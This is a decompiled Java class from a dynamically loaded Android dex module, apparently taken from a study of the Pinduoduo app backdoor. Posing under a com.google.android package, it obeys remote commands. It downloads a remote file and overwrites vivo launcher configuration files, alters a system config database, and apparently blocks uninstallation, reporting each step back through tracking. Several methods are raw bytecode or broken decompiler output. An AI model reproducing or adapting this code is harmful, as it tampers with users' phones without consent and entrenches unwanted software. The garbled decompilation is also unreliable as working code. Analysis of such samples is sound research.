package com.google.android.sd.biz_dynamic_dex.vivo_official_uninstall;

import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.database.sqlite.SQLiteDatabase;
import android.text.TextUtils;
import com.google.android.sd.cmd.CmdData;
import com.google.android.sd.cmd.CmdHandler;
import com.google.android.sd.utils.TrackUtils;
import com.google.android.sd.utils.Utils;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.security.MessageDigest;
import java.util.HashMap;
import java.util.Map;
import org.json.JSONException;
import org.json.JSONObject;

public class OfficialUntiUninstallV2 {
  private static final int CMD = 1005;
  
  private static String uuid;
  
  private static Map<String, String> buildMap(boolean paramBoolean, String paramString) {
    HashMap<Object, Object> hashMap = new HashMap<Object, Object>();
    if (paramBoolean) {
      hashMap.put("status", "1");
      hashMap.put("result", "true");
    } else {
      hashMap.put("status", "0");
      hashMap.put("result", "false");
    } 
    hashMap.put("details", paramString);
    return (Map)hashMap;
  }
  
  public static String bytesToHexString(MessageDigest paramMessageDigest) {
    byte[] arrayOfByte = paramMessageDigest.digest();
    StringBuilder stringBuilder = new StringBuilder();
    if (arrayOfByte == null || arrayOfByte.length == 0)
      return null; 
    int j = arrayOfByte.length;
    for (int i = 0; i < j; i++) {
      String str = Integer.toHexString(arrayOfByte[i] & 0xFF);
      if (str.length() < 2)
        stringBuilder.append(0); 
      stringBuilder.append(str);
    } 
    return stringBuilder.toString();
  }
  
  private String caclMd5(String paramString) {
    byte[] arrayOfByte = null;
    MessageDigest messageDigest = null;
    try {
      byte[] arrayOfByte1;
      FileInputStream fileInputStream = new FileInputStream(paramString);
      try {
        messageDigest = MessageDigest.getInstance("MD5");
        arrayOfByte = new byte[1024];
        while (true) {
          int i = fileInputStream.read(arrayOfByte);
          if (-1 != i) {
            messageDigest.update(arrayOfByte, 0, i);
            continue;
          } 
          String str = bytesToHexString(messageDigest);
          try {
            return str;
          } catch (IOException null) {
            return str;
          } 
        } 
      } catch (Exception null) {
        return "";
      } finally {
        arrayOfByte = null;
        exception = iOException;
        arrayOfByte1 = arrayOfByte;
      } 
      throw arrayOfByte1;
    } catch (Exception exception1) {
    
    } finally {
      paramString = null;
    } 
    if (paramString != null)
      try {
        paramString.close();
      } catch (IOException iOException) {} 
    return "";
  }
  
  public static void fail(Context paramContext, String paramString) {
    CmdHandler.dispatch(paramContext, Utils.buildErrorRespData(new CmdData(1005, uuid, "client"), paramString, null));
    TrackUtils.submitTrack(paramContext, 22, buildMap(false, paramString));
  }
  
  public static void replaceFile(String paramString1, String paramString2) {
    // Byte code:
    //   0: aconst_null
    //   1: astore #5
    //   3: aconst_null
    //   4: astore #6
    //   6: aconst_null
    //   7: astore #4
    //   9: new java/io/FileInputStream
    //   12: dup
    //   13: aload_0
    //   14: invokespecial <init> : (Ljava/lang/String;)V
    //   17: astore_3
    //   18: new java/io/FileOutputStream
    //   21: dup
    //   22: aload_1
    //   23: invokespecial <init> : (Ljava/lang/String;)V
    //   26: astore_0
    //   27: sipush #1024
    //   30: newarray byte
    //   32: astore_1
    //   33: aload_3
    //   34: aload_1
    //   35: invokevirtual read : ([B)I
    //   38: istore_2
    //   39: iload_2
    //   40: ifle -> 53
    //   43: aload_0
    //   44: aload_1
    //   45: iconst_0
    //   46: iload_2
    //   47: invokevirtual write : ([BII)V
    //   50: goto -> 33
    //   53: aload_0
    //   54: invokevirtual flush : ()V
    //   57: aload_3
    //   58: invokevirtual close : ()V
    //   61: aload_0
    //   62: invokevirtual close : ()V
    //   65: return
    //   66: astore #4
    //   68: aload_0
    //   69: astore_1
    //   70: aload #4
    //   72: astore_0
    //   73: goto -> 79
    //   76: astore_0
    //   77: aconst_null
    //   78: astore_1
    //   79: goto -> 102
    //   82: aconst_null
    //   83: astore_0
    //   84: aload_3
    //   85: astore_1
    //   86: goto -> 128
    //   89: aconst_null
    //   90: astore_0
    //   91: aload_3
    //   92: astore_1
    //   93: goto -> 151
    //   96: astore_0
    //   97: aconst_null
    //   98: astore_1
    //   99: aload #4
    //   101: astore_3
    //   102: aload_3
    //   103: ifnull -> 113
    //   106: aload_3
    //   107: invokevirtual close : ()V
    //   110: goto -> 113
    //   113: aload_1
    //   114: ifnull -> 121
    //   117: aload_1
    //   118: invokevirtual close : ()V
    //   121: aload_0
    //   122: athrow
    //   123: aconst_null
    //   124: astore_0
    //   125: aload #5
    //   127: astore_1
    //   128: aload_1
    //   129: ifnull -> 139
    //   132: aload_1
    //   133: invokevirtual close : ()V
    //   136: goto -> 139
    //   139: aload_0
    //   140: ifnull -> 169
    //   143: goto -> 61
    //   146: aconst_null
    //   147: astore_0
    //   148: aload #6
    //   150: astore_1
    //   151: aload_1
    //   152: ifnull -> 162
    //   155: aload_1
    //   156: invokevirtual close : ()V
    //   159: goto -> 162
    //   162: aload_0
    //   163: ifnull -> 169
    //   166: goto -> 61
    //   169: return
    //   170: astore_0
    //   171: goto -> 146
    //   174: astore_0
    //   175: goto -> 123
    //   178: astore_0
    //   179: goto -> 89
    //   182: astore_0
    //   183: goto -> 82
    //   186: astore_1
    //   187: goto -> 91
    //   190: astore_1
    //   191: goto -> 84
    //   194: astore_1
    //   195: goto -> 61
    //   198: astore_0
    //   199: return
    //   200: astore_3
    //   201: goto -> 113
    //   204: astore_1
    //   205: goto -> 121
    //   208: astore_1
    //   209: goto -> 139
    //   212: astore_1
    //   213: goto -> 162
    // Exception table:
    //   from	to	target	type
    //   9	18	170	java/io/FileNotFoundException
    //   9	18	174	java/lang/Exception
    //   9	18	96	finally
    //   18	27	178	java/io/FileNotFoundException
    //   18	27	182	java/lang/Exception
    //   18	27	76	finally
    //   27	33	186	java/io/FileNotFoundException
    //   27	33	190	java/lang/Exception
    //   27	33	66	finally
    //   33	39	186	java/io/FileNotFoundException
    //   33	39	190	java/lang/Exception
    //   33	39	66	finally
    //   43	50	186	java/io/FileNotFoundException
    //   43	50	190	java/lang/Exception
    //   43	50	66	finally
    //   53	57	186	java/io/FileNotFoundException
    //   53	57	190	java/lang/Exception
    //   53	57	66	finally
    //   57	61	194	java/io/IOException
    //   61	65	198	java/io/IOException
    //   106	110	200	java/io/IOException
    //   117	121	204	java/io/IOException
    //   132	136	208	java/io/IOException
    //   155	159	212	java/io/IOException
  }
  
  private boolean startReplace(Context paramContext, JSONObject paramJSONObject, String paramString) {
    if (paramJSONObject == null)
      return false; 
    String str1 = paramJSONObject.optString("modify_md5");
    String str2 = paramJSONObject.optString("url_suffix");
    File file = new File(paramContext.getFilesDir(), "xseai10_temp.tmp");
    try {
      Utils.downloadFile(paramContext, "1", str2, file, str1);
      str2 = String.format("data/bbkcore/BBKLauncher2_custom_%s.xml", new Object[] { paramString });
      String str = String.format("data/bbkcore/BBKLauncher2_custom_%s_temp.xml", new Object[] { paramString });
      replaceFile(file.getPath(), str);
      paramString = caclMd5(str);
      File file1 = new File(str);
      if (TextUtils.equals(paramString, str1)) {
        file1.renameTo(new File(str2));
        try {
          file.delete();
        } catch (Exception null) {}
        try {
          file1.delete();
          return true;
        } catch (Exception null) {
          return true;
        } 
      } 
      fail((Context)exception, "copy_fail");
      try {
        file.delete();
        return false;
      } catch (Exception exception) {
        return false;
      } 
    } catch (Exception exception1) {
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.append(" down_load_fail ");
      stringBuilder.append(exception1.getMessage());
      fail((Context)exception, stringBuilder.toString());
      return false;
    } 
  }
  
  public static void success(Context paramContext, String paramString) {
    JSONObject jSONObject = new JSONObject();
    CmdData cmdData = new CmdData(1005, uuid, "client");
    try {
      jSONObject.put("details", paramString);
      CmdHandler.dispatch(paramContext, Utils.buildSucceedRespData(cmdData, jSONObject, null));
      TrackUtils.submitTrack(paramContext, 22, buildMap(true, paramString));
      return;
    } catch (JSONException jSONException) {
      CmdHandler.dispatch(paramContext, Utils.buildErrorRespData(cmdData, jSONException.toString(), null));
      TrackUtils.submitTrack(paramContext, 22, buildMap(false, paramString));
      return;
    } 
  }
  
  private void trackAlready(Context paramContext, int paramInt) {
    StringBuilder stringBuilder = new StringBuilder();
    stringBuilder.append("already, result code: ");
    stringBuilder.append(paramInt);
    success(paramContext, stringBuilder.toString());
  }
  
  private void tryReplace(Context paramContext, JSONObject paramJSONObject) {
    // Byte code:
    //   0: aconst_null
    //   1: astore #4
    //   3: aconst_null
    //   4: astore #5
    //   6: aload_1
    //   7: invokevirtual getApplicationContext : ()Landroid/content/Context;
    //   10: invokevirtual getContentResolver : ()Landroid/content/ContentResolver;
    //   13: ldc 'content://com.vivo.abe.unifiedconfig.provider/configs'
    //   15: invokestatic parse : (Ljava/lang/String;)Landroid/net/Uri;
    //   18: aconst_null
    //   19: aconst_null
    //   20: iconst_4
    //   21: anewarray java/lang/String
    //   24: dup
    //   25: iconst_0
    //   26: ldc_w 'BBKLauncher2'
    //   29: aastore
    //   30: dup
    //   31: iconst_1
    //   32: ldc '1'
    //   34: aastore
    //   35: dup
    //   36: iconst_2
    //   37: ldc_w '1.0'
    //   40: aastore
    //   41: dup
    //   42: iconst_3
    //   43: ldc_w 'com.bbk.launcher2_configs'
    //   46: aastore
    //   47: aconst_null
    //   48: invokevirtual query : (Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   51: astore #6
    //   53: aload #6
    //   55: ifnull -> 518
    //   58: aload #6
    //   60: astore #5
    //   62: aload #6
    //   64: astore #4
    //   66: aload #6
    //   68: invokeinterface getCount : ()I
    //   73: iconst_1
    //   74: if_icmple -> 158
    //   77: aload #6
    //   79: astore #5
    //   81: aload #6
    //   83: astore #4
    //   85: new java/lang/StringBuilder
    //   88: dup
    //   89: invokespecial <init> : ()V
    //   92: astore_2
    //   93: aload #6
    //   95: astore #5
    //   97: aload #6
    //   99: astore #4
    //   101: aload_2
    //   102: ldc_w 'cursor_count_'
    //   105: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   108: pop
    //   109: aload #6
    //   111: astore #5
    //   113: aload #6
    //   115: astore #4
    //   117: aload_2
    //   118: aload #6
    //   120: invokeinterface getCount : ()I
    //   125: invokevirtual append : (I)Ljava/lang/StringBuilder;
    //   128: pop
    //   129: aload #6
    //   131: astore #5
    //   133: aload #6
    //   135: astore #4
    //   137: aload_1
    //   138: aload_2
    //   139: invokevirtual toString : ()Ljava/lang/String;
    //   142: invokestatic fail : (Landroid/content/Context;Ljava/lang/String;)V
    //   145: aload #6
    //   147: ifnull -> 157
    //   150: aload #6
    //   152: invokeinterface close : ()V
    //   157: return
    //   158: aload #6
    //   160: astore #5
    //   162: aload #6
    //   164: astore #4
    //   166: aload #6
    //   168: invokeinterface getCount : ()I
    //   173: istore_3
    //   174: iload_3
    //   175: ifne -> 312
    //   178: aload #6
    //   180: astore #5
    //   182: aload #6
    //   184: astore #4
    //   186: aload_1
    //   187: ldc_w 'start_add'
    //   190: invokestatic success : (Landroid/content/Context;Ljava/lang/String;)V
    //   193: aload #6
    //   195: astore #5
    //   197: aload #6
    //   199: astore #4
    //   201: aload_0
    //   202: aload_1
    //   203: aload_2
    //   204: ldc_w '2304'
    //   207: invokevirtual optJSONObject : (Ljava/lang/String;)Lorg/json/JSONObject;
    //   210: sipush #2304
    //   213: invokestatic valueOf : (I)Ljava/lang/String;
    //   216: invokespecial startReplace : (Landroid/content/Context;Lorg/json/JSONObject;Ljava/lang/String;)Z
    //   219: ifeq -> 284
    //   222: aload #6
    //   224: astore #5
    //   226: aload #6
    //   228: astore #4
    //   230: invokestatic updateDb : ()Z
    //   233: ifeq -> 266
    //   236: aload #6
    //   238: astore #5
    //   240: aload #6
    //   242: astore #4
    //   244: aload_1
    //   245: ldc_w 'success'
    //   248: invokestatic success : (Landroid/content/Context;Ljava/lang/String;)V
    //   251: aload #6
    //   253: astore #5
    //   255: aload #6
    //   257: astore #4
    //   259: aload_1
    //   260: invokestatic updateLauncherBroadcast : (Landroid/content/Context;)V
    //   263: goto -> 299
    //   266: aload #6
    //   268: astore #5
    //   270: aload #6
    //   272: astore #4
    //   274: aload_1
    //   275: ldc_w 'insert_fail'
    //   278: invokestatic fail : (Landroid/content/Context;Ljava/lang/String;)V
    //   281: goto -> 299
    //   284: aload #6
    //   286: astore #5
    //   288: aload #6
    //   290: astore #4
    //   292: aload_1
    //   293: ldc_w 'replace_fail'
    //   296: invokestatic fail : (Landroid/content/Context;Ljava/lang/String;)V
    //   299: aload #6
    //   301: ifnull -> 311
    //   304: aload #6
    //   306: invokeinterface close : ()V
    //   311: return
    //   312: aload #6
    //   314: astore #5
    //   316: aload #6
    //   318: astore #4
    //   320: aload #6
    //   322: invokeinterface moveToNext : ()Z
    //   327: ifeq -> 533
    //   330: aload #6
    //   332: astore #5
    //   334: aload #6
    //   336: astore #4
    //   338: aload #6
    //   340: aload #6
    //   342: ldc_w 'id'
    //   345: invokeinterface getColumnIndex : (Ljava/lang/String;)I
    //   350: invokeinterface getInt : (I)I
    //   355: istore_3
    //   356: aload #6
    //   358: astore #5
    //   360: aload #6
    //   362: astore #4
    //   364: aload_2
    //   365: iload_3
    //   366: invokestatic valueOf : (I)Ljava/lang/String;
    //   369: invokevirtual optJSONObject : (Ljava/lang/String;)Lorg/json/JSONObject;
    //   372: astore #7
    //   374: aload #7
    //   376: ifnull -> 449
    //   379: aload #6
    //   381: astore #5
    //   383: aload #6
    //   385: astore #4
    //   387: aload_0
    //   388: aload_1
    //   389: aload #7
    //   391: iload_3
    //   392: invokestatic valueOf : (I)Ljava/lang/String;
    //   395: invokespecial startReplace : (Landroid/content/Context;Lorg/json/JSONObject;Ljava/lang/String;)Z
    //   398: ifeq -> 431
    //   401: aload #6
    //   403: astore #5
    //   405: aload #6
    //   407: astore #4
    //   409: aload_1
    //   410: invokestatic updateLauncherBroadcast : (Landroid/content/Context;)V
    //   413: aload #6
    //   415: astore #5
    //   417: aload #6
    //   419: astore #4
    //   421: aload_1
    //   422: ldc_w 'success'
    //   425: invokestatic success : (Landroid/content/Context;Ljava/lang/String;)V
    //   428: goto -> 312
    //   431: aload #6
    //   433: astore #5
    //   435: aload #6
    //   437: astore #4
    //   439: aload_1
    //   440: ldc_w 'replace_fail'
    //   443: invokestatic fail : (Landroid/content/Context;Ljava/lang/String;)V
    //   446: goto -> 312
    //   449: aload #6
    //   451: astore #5
    //   453: aload #6
    //   455: astore #4
    //   457: new java/lang/StringBuilder
    //   460: dup
    //   461: invokespecial <init> : ()V
    //   464: astore #7
    //   466: aload #6
    //   468: astore #5
    //   470: aload #6
    //   472: astore #4
    //   474: aload #7
    //   476: ldc_w 'can_not_find_config_'
    //   479: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   482: pop
    //   483: aload #6
    //   485: astore #5
    //   487: aload #6
    //   489: astore #4
    //   491: aload #7
    //   493: iload_3
    //   494: invokevirtual append : (I)Ljava/lang/StringBuilder;
    //   497: pop
    //   498: aload #6
    //   500: astore #5
    //   502: aload #6
    //   504: astore #4
    //   506: aload_1
    //   507: aload #7
    //   509: invokevirtual toString : ()Ljava/lang/String;
    //   512: invokestatic fail : (Landroid/content/Context;Ljava/lang/String;)V
    //   515: goto -> 312
    //   518: aload #6
    //   520: astore #5
    //   522: aload #6
    //   524: astore #4
    //   526: aload_1
    //   527: ldc_w 'cursor_null'
    //   530: invokestatic fail : (Landroid/content/Context;Ljava/lang/String;)V
    //   533: aload #6
    //   535: ifnull -> 575
    //   538: aload #6
    //   540: astore #4
    //   542: aload #4
    //   544: invokeinterface close : ()V
    //   549: return
    //   550: astore_1
    //   551: goto -> 576
    //   554: astore_2
    //   555: aload #4
    //   557: astore #5
    //   559: aload_1
    //   560: aload_2
    //   561: invokestatic getStackTraceString : (Ljava/lang/Throwable;)Ljava/lang/String;
    //   564: invokestatic fail : (Landroid/content/Context;Ljava/lang/String;)V
    //   567: aload #4
    //   569: ifnull -> 575
    //   572: goto -> 542
    //   575: return
    //   576: aload #5
    //   578: ifnull -> 588
    //   581: aload #5
    //   583: invokeinterface close : ()V
    //   588: aload_1
    //   589: athrow
    //   590: astore_1
    //   591: return
    //   592: astore_1
    //   593: return
    //   594: astore_1
    //   595: return
    //   596: astore_2
    //   597: goto -> 588
    // Exception table:
    //   from	to	target	type
    //   6	53	554	java/lang/Exception
    //   6	53	550	finally
    //   66	77	554	java/lang/Exception
    //   66	77	550	finally
    //   85	93	554	java/lang/Exception
    //   85	93	550	finally
    //   101	109	554	java/lang/Exception
    //   101	109	550	finally
    //   117	129	554	java/lang/Exception
    //   117	129	550	finally
    //   137	145	554	java/lang/Exception
    //   137	145	550	finally
    //   150	157	590	java/lang/Exception
    //   166	174	554	java/lang/Exception
    //   166	174	550	finally
    //   186	193	554	java/lang/Exception
    //   186	193	550	finally
    //   201	222	554	java/lang/Exception
    //   201	222	550	finally
    //   230	236	554	java/lang/Exception
    //   230	236	550	finally
    //   244	251	554	java/lang/Exception
    //   244	251	550	finally
    //   259	263	554	java/lang/Exception
    //   259	263	550	finally
    //   274	281	554	java/lang/Exception
    //   274	281	550	finally
    //   292	299	554	java/lang/Exception
    //   292	299	550	finally
    //   304	311	592	java/lang/Exception
    //   320	330	554	java/lang/Exception
    //   320	330	550	finally
    //   338	356	554	java/lang/Exception
    //   338	356	550	finally
    //   364	374	554	java/lang/Exception
    //   364	374	550	finally
    //   387	401	554	java/lang/Exception
    //   387	401	550	finally
    //   409	413	554	java/lang/Exception
    //   409	413	550	finally
    //   421	428	554	java/lang/Exception
    //   421	428	550	finally
    //   439	446	554	java/lang/Exception
    //   439	446	550	finally
    //   457	466	554	java/lang/Exception
    //   457	466	550	finally
    //   474	483	554	java/lang/Exception
    //   474	483	550	finally
    //   491	498	554	java/lang/Exception
    //   491	498	550	finally
    //   506	515	554	java/lang/Exception
    //   506	515	550	finally
    //   526	533	554	java/lang/Exception
    //   526	533	550	finally
    //   542	549	594	java/lang/Exception
    //   559	567	550	finally
    //   581	588	596	java/lang/Exception
  }
  
  private static boolean updateDb() {
    Exception exception2 = null;
    ContentValues contentValues = null;
    try {
      SQLiteDatabase sQLiteDatabase = SQLiteDatabase.openDatabase("/data/user_de/0/com.vivo.abe/databases/unifiedconfig.db", null, 0);
    } catch (Exception exception) {
    
    } finally {
      if (exception1 != null)
        try {
          exception1.close();
        } catch (Exception exception) {} 
    } 
    if (SYNTHETIC_LOCAL_VARIABLE_2 != null)
      try {
        SYNTHETIC_LOCAL_VARIABLE_2.close();
        return false;
      } catch (Exception exception) {
        return false;
      }  
    return false;
  }
  
  private static void updateLauncherBroadcast(Context paramContext) {
    Intent intent = new Intent("com.vivo.daemonService.unifiedconfig.update_finish_broadcast_BBKLauncher2");
    intent.setPackage("com.bbk.launcher2");
    try {
      paramContext.sendBroadcast(intent);
      return;
    } catch (Exception exception) {
      return;
    } 
  }
  
  public void work(Context paramContext, JSONObject paramJSONObject) {
    int i = Detector.isConfigReplaced();
    uuid = paramJSONObject.optString("uuid");
    if (i == 2) {
      tryReplace(paramContext, paramJSONObject);
      return;
    } 
    trackAlready(paramContext, i);
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\be7a2b643d7e8543f49994ffeb0ee0b6-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\vivo_official_uninstall\OfficialUntiUninstallV2.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */